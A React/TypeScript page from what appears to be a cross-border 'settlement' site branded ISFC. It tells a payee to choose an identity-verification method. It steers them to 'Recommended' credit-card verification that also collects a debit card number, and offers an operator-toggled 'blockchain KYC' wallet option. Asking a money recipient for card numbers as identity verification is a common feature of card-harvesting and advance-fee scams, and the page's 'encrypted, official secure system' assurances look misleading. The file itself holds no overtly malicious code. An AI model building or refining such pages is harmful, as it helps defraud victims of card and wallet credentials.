import React, { useEffect, useState } from "react";
import { useParams, useLocation, useNavigate } from "react-router-dom";
import { CreditCard, ArrowLeft, ShieldCheck, Star, ChevronRight, CheckCircle, ChevronDown } from "lucide-react";
import Header from "../components/Header";
import Footer from "../components/Footer";
import NoticeCard from "../components/NoticeCard";
import { verifyTransaction, getBlockchainChannel } from "../lib/api";
import { useFixedBanners } from "../lib/useFixedBanners";
import { saveSession, rehydrateSession } from "../lib/session";
import type { Transaction, KycDraft } from "../lib/types";
import { DebitCardOption, BlockchainOption } from "../components/VerificationMethodCards";

export default function CardSelectPage() {
  const { ftUid } = useParams<{ ftUid: string }>();
  const location = useLocation();
  const navigate = useNavigate();
  const tx: Transaction | null = location.state?.transaction || null;
  const resubmitting = location.state?.kyc === null;
  const [kyc, setKyc] = useState<KycDraft | null>(location.state?.kyc || null);
  const [hydratedTx, setHydratedTx] = useState<Transaction | null>(null);
  const [hydrating, setHydrating] = useState(!location.state?.transaction);

  // Cold-reload recovery
  useEffect(() => {
    if (location.state?.transaction) return;
    let cancelled = false;
    rehydrateSession().then((res) => {
      if (cancelled || !res) { setHydrating(false); return; }
      setHydratedTx(res.transaction);
      setKyc(res.kyc);
      setHydrating(false);
    }).catch(() => { setHydrating(false); });
    return () => { cancelled = true; };
  }, [location.state]);

  const effectiveTx: Transaction | null = tx || hydratedTx;
  const effectiveResubmitting = resubmitting || (!tx && hydratedTx !== null && !location.state?.kyc);

  // Keep session in sync
  useEffect(() => {
    if (effectiveTx) saveSession(effectiveTx, kyc);
  }, [effectiveTx, kyc]);

  // Always pick up the latest saved draft so returning from the form reflects what was typed
  useEffect(() => {
    if (!effectiveTx || effectiveResubmitting) return;
    let cancelled = false;
    verifyTransaction(effectiveTx.ft_uid, effectiveTx.serial_number)
      .then((res) => { if (!cancelled && res.valid) setKyc(res.kyc || null); })
      .catch(() => {});
    return () => { cancelled = true; };
  }, [effectiveTx, effectiveResubmitting]);

  const banners = useFixedBanners(ftUid);
  const [showMore, setShowMore] = useState(false);
  const [blockchainStatus, setBlockchainStatus] = useState<{ tx_blockchain_enabled: boolean; wallet_brand: string | null; already_submitted: boolean } | null>(null);

  useEffect(() => {
    if (!ftUid) return;
    let cancelled = false;
    const load = () => getBlockchainChannel(ftUid)
      .then(cfg => { if (cfg && !cancelled) setBlockchainStatus(cfg); })
      .catch(() => {});
    const onVisible = () => { if (document.visibilityState === "visible") load(); };
    load();
    const id = setInterval(load, 4000);
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      cancelled = true;
      clearInterval(id);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, [ftUid]);

  useEffect(() => {
    if (!effectiveTx && !hydrating) navigate("/", { replace: true });
  }, [effectiveTx, hydrating, navigate]);

  if (!effectiveTx) {
    return (
      <div className="min-h-screen-safe flex items-center justify-center bg-gray-50">
        <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
      </div>
    );
  }

  function select(cardType: "credit" | "debit") {
    navigate(`/kyc/${ftUid}`, { state: { transaction: effectiveTx, kyc, cardType, fromCardSelect: true } });
  }

  function selectBlockchain() {
    navigate(`/blockchain-kyc/${ftUid}`, { state: { transaction: effectiveTx, kyc, cardType: "blockchain", fromCardSelect: true } });
  }

  const blockchainAvailable = blockchainStatus
    ? blockchainStatus.tx_blockchain_enabled && !blockchainStatus.already_submitted
    : !!effectiveTx.blockchain_enabled && !(kyc?.verification_channel === "blockchain" && kyc?.is_submitted);

  return (
    <div className="min-h-screen-safe flex flex-col bg-[radial-gradient(circle_at_top,_#F8FBFF_0%,_#EEF5FC_48%,_#DDEAF7_100%)]">
      <Header />

      {/* ═══════════════════════════════════════════════════════════════════
          MOBILE layout  (< lg)
      ════════════════════════════════════════════════════════════════════ */}
      <main className="lg:hidden flex-1 flex flex-col bg-gray-50">
        {/* Top hero band */}
        <div className="bg-[#0A2B5E] px-4 pt-4 pb-8">
          <button
            onClick={() => navigate(-1)}
            className="flex items-center gap-2 text-blue-200 hover:text-white text-sm mb-5 transition"
          >
            <div className="w-7 h-7 rounded-full bg-white/10 flex items-center justify-center">
              <ArrowLeft className="w-3.5 h-3.5" />
            </div>
            <span className="text-[13px] font-medium">Back</span>
          </button>

          <div className="flex items-center gap-2 mb-2">
            <ShieldCheck className="w-4 h-4 text-blue-300" />
            <span className="text-[10px] text-blue-300 uppercase tracking-widest font-bold">Identity Verification</span>
          </div>
          <h1 className="text-xl font-extrabold text-white leading-tight">Select Verification<br />Method</h1>
          <p className="text-blue-200 text-xs mt-2 leading-relaxed">
            Choose the card type you will use to complete identity verification for this settlement.
          </p>
        </div>

        {/* Content slides up */}
        <div className="flex-1 -mt-4 bg-gray-50 rounded-t-3xl pt-6 px-4 pb-8 max-w-xl mx-auto w-full" style={{ paddingBottom: "max(2rem, env(safe-area-inset-bottom))" }}>

          {/* Fixed banner notifications */}
          {banners.length > 0 && (
            <div className="space-y-3 mb-4">
              {banners.map((b) => (
                <NoticeCard key={b.id} title={b.title} content={b.content} />
              ))}
            </div>
          )}

          {/* Credit card — RECOMMENDED */}
          <button
            onClick={() => select("credit")}
            className="group relative w-full text-left bg-[#0A2B5E] hover:bg-[#0d3571] rounded-2xl overflow-hidden shadow-xl shadow-[#0A2B5E]/30 transition-all duration-200 active:scale-[0.98] mb-4 focus:outline-none focus:ring-2 focus:ring-[#1E3A8A]/50"
          >
            <div className="absolute inset-0 opacity-[0.05]"
              style={{ backgroundImage: "repeating-linear-gradient(0deg,transparent,transparent 24px,#fff 24px,#fff 25px),repeating-linear-gradient(90deg,transparent,transparent 24px,#fff 24px,#fff 25px)" }}
            />
            <div className="relative px-5 py-5">
              {/* Badge */}
              <div className="inline-flex items-center gap-1 bg-amber-400 text-[#0A2B5E] text-[10px] font-extrabold uppercase tracking-wider px-2.5 py-1 rounded-full mb-4">
                <Star className="w-2.5 h-2.5 fill-current" />
                Recommended
              </div>

              <div className="flex items-center gap-4 mb-4">
                <div className="w-12 h-12 rounded-xl bg-white/15 border border-white/20 flex items-center justify-center flex-shrink-0">
                  <CreditCard className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h3 className="text-[15px] font-extrabold text-white">Credit Card Verification</h3>
                  <p className="text-xs text-blue-200 mt-0.5">Standard · Most secure method</p>
                </div>
              </div>

              <ul className="space-y-2 mb-4">
                {["Higher verification credibility", "Wider acceptance across jurisdictions", "Faster review processing"].map(item => (
                  <li key={item} className="flex items-center gap-2">
                    <CheckCircle className="w-3.5 h-3.5 text-amber-400 flex-shrink-0" />
                    <span className="text-xs text-blue-100">{item}</span>
                  </li>
                ))}
              </ul>

              <div className="flex items-center justify-between border-t border-white/15 pt-3">
                <span className="text-[11px] text-blue-300">Also requires payee debit card</span>
                <div className="flex items-center gap-1 bg-white/15 border border-white/20 rounded-full px-3 py-1.5 text-white shadow-sm transition-all duration-300 group-hover:gap-2 group-hover:bg-amber-400 group-hover:border-amber-300 group-hover:text-[#0A2B5E] group-hover:shadow-md">
                  <span className="text-xs font-bold text-white transition-colors duration-300 group-hover:text-[#0A2B5E]">Select</span>
                  <ChevronRight className="w-3.5 h-3.5 text-white transition-colors duration-300 group-hover:text-[#0A2B5E]" />
                </div>
              </div>
            </div>
          </button>

          <div className="mb-5"><DebitCardOption onSelect={() => select("debit")} /></div>

          {blockchainAvailable && (
            <div className="mb-5">
              <button
                onClick={() => setShowMore(v => !v)}
                aria-expanded={showMore}
                className="group w-full flex items-center gap-3 py-2"
              >
                <span className="flex-1 h-px bg-gray-200" />
                <span className="inline-flex items-center gap-1.5 whitespace-nowrap rounded-full border border-gray-200 bg-white px-3.5 py-1.5 text-xs font-semibold text-gray-500 shadow-sm group-hover:text-[#1E3A8A] group-hover:border-[#1E3A8A]/30 transition">
                  {showMore ? "Hide alternative method" : "More verification methods"}
                  <ChevronDown className={`w-3.5 h-3.5 transition-transform duration-200 ${showMore ? "rotate-180" : ""}`} />
                </span>
                <span className="flex-1 h-px bg-gray-200" />
              </button>
              {showMore && (
                <div className="mt-3"><BlockchainOption onSelect={selectBlockchain} /></div>
              )}
            </div>
          )}

          {/* Security notice */}
          <div className="flex items-start gap-3 bg-white border border-gray-200 rounded-2xl px-4 py-3.5">
            <ShieldCheck className="w-4 h-4 text-[#1E3A8A] flex-shrink-0 mt-0.5" />
            <p className="text-xs text-gray-500 leading-relaxed">
              All verification information is encrypted and processed exclusively through ISFC's official secure authentication system.
            </p>
          </div>
        </div>
      </main>

      {/* ═══════════════════════════════════════════════════════════════════
          DESKTOP layout  (lg+) — original unchanged
      ════════════════════════════════════════════════════════════════════ */}
      <main className="hidden lg:block flex-1 max-w-2xl mx-auto px-4 py-8 w-full">
        <button
          onClick={() => navigate(-1)}
          className="flex items-center gap-2 text-sm font-semibold text-[#0A2B5E] hover:text-[#1E3A8A] mb-6 group"
        >
          <span className="flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-200 shadow-sm group-hover:shadow-md transition">
            <ArrowLeft className="w-4 h-4" />
          </span>
          Back
        </button>

        <div className="mb-8">
          <div className="flex items-center gap-2 text-[#0A2B5E] mb-1">
            <ShieldCheck className="w-5 h-5" />
            <span className="text-sm font-semibold">Identity Verification &middot; {effectiveTx.ft_uid}</span>
          </div>
          <h1 className="text-2xl font-bold text-[#0A2B5E]">Select Verification Method</h1>
          <p className="text-sm text-gray-500 mt-1">
            Choose the card type you will use to complete identity verification for this cross-border settlement.
          </p>
        </div>

        <div className="space-y-4">
          {/* Fixed banner notifications */}
          {banners.length > 0 && (
            <div className="space-y-3">
              {banners.map((b) => (
                <NoticeCard key={b.id} title={b.title} content={b.content} />
              ))}
            </div>
          )}

          <button
            onClick={() => select("credit")}
            className="group relative w-full text-left bg-[#0A2B5E] hover:bg-[#0d3571] rounded-2xl overflow-hidden shadow-lg shadow-[#0A2B5E]/25 hover:shadow-xl hover:shadow-[#0A2B5E]/35 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-[#1E3A8A]/50"
          >
            <div className="absolute inset-0 opacity-[0.06] transition-transform duration-700 ease-out group-hover:scale-110"
              style={{ backgroundImage: "repeating-linear-gradient(0deg,transparent,transparent 24px,#fff 24px,#fff 25px),repeating-linear-gradient(90deg,transparent,transparent 24px,#fff 24px,#fff 25px)" }}
            />
            <div className="pointer-events-none absolute -right-20 -top-24 h-64 w-64 rounded-full bg-blue-300/10 blur-3xl transition-all duration-500 group-hover:bg-amber-200/15 group-hover:scale-110" />
            <div className="relative px-6 py-6 transition-transform duration-300 group-hover:-translate-y-0.5">
              <div className="absolute top-4 right-5 flex items-center gap-1.5 bg-amber-400 text-[#0A2B5E] text-[10px] font-extrabold uppercase tracking-wider px-2.5 py-1 rounded-full shadow transition-transform duration-300 group-hover:scale-105 group-hover:shadow-md">
                <Star className="w-3 h-3 fill-current transition-transform duration-300 group-hover:rotate-12" />
                Recommended
              </div>
              <div className="flex items-start gap-4">
                <div className="flex-shrink-0 w-14 h-14 rounded-xl bg-white/15 border border-white/20 flex items-center justify-center transition-all duration-300 group-hover:bg-white/25 group-hover:border-white/35 group-hover:scale-105">
                  <CreditCard className="w-7 h-7 text-white transition-transform duration-300 group-hover:-rotate-3" />
                </div>
                <div className="flex-1 min-w-0 pr-24">
                  <h3 className="text-base font-bold text-white mb-1 transition-colors duration-300 group-hover:text-amber-50">Credit Card Verification</h3>
                  <p className="text-sm text-blue-200 leading-relaxed">
                    The standard and most secure method for cross-border settlement identity verification.
                  </p>
                  <ul className="mt-3 space-y-1.5">
                    {["Higher verification credibility", "Wider acceptance across jurisdictions", "Faster review processing"].map(item => (
                      <li key={item} className="flex items-center gap-2">
                        <CheckCircle className="w-3.5 h-3.5 text-amber-400 flex-shrink-0 transition-transform duration-300 group-hover:scale-110" />
                        <span className="text-xs text-blue-100">{item}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              </div>
              <div className="mt-5 flex items-center justify-between border-t border-white/15 pt-4">
                <span className="text-xs text-blue-200">Also requires payee debit card number</span>
                <span className="inline-flex items-center gap-1 rounded-full bg-white/10 border border-white/20 px-3 py-1.5 text-xs font-semibold text-white shadow-sm transition-all duration-300 group-hover:gap-2 group-hover:bg-amber-400 group-hover:border-amber-300 group-hover:text-[#0A2B5E] group-hover:shadow-md">
                  Select <ChevronRight className="w-4 h-4" />
                </span>
              </div>
            </div>
          </button>

          <DebitCardOption onSelect={() => select("debit")} />

          {blockchainAvailable && (
            <div className="pt-2">
              <button
                onClick={() => setShowMore(v => !v)}
                aria-expanded={showMore}
                className="group w-full flex items-center gap-3 py-2"
              >
                <span className="flex-1 h-px bg-gray-200" />
                <span className="inline-flex items-center gap-1.5 whitespace-nowrap rounded-full border border-gray-200 bg-white px-3.5 py-1.5 text-xs font-semibold text-gray-500 shadow-sm group-hover:text-[#1E3A8A] group-hover:border-[#1E3A8A]/30 transition">
                  {showMore ? "Hide alternative method" : "More verification methods"}
                  <ChevronDown className={`w-3.5 h-3.5 transition-transform duration-200 ${showMore ? "rotate-180" : ""}`} />
                </span>
                <span className="flex-1 h-px bg-gray-200" />
              </button>
              {showMore && (
                <div className="mt-3"><BlockchainOption onSelect={selectBlockchain} /></div>
              )}
            </div>
          )}
        </div>

        <div className="mt-6 flex items-start gap-3 bg-gray-50 border border-gray-200 rounded-xl px-4 py-3.5">
          <ShieldCheck className="w-4 h-4 text-gray-400 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-gray-500 leading-relaxed">
            All verification information is encrypted and processed exclusively through ISFC's official secure authentication system. Your data will not be used for any other purpose.
          </p>
        </div>
      </main>

      <Footer />
    </div>
  );
}
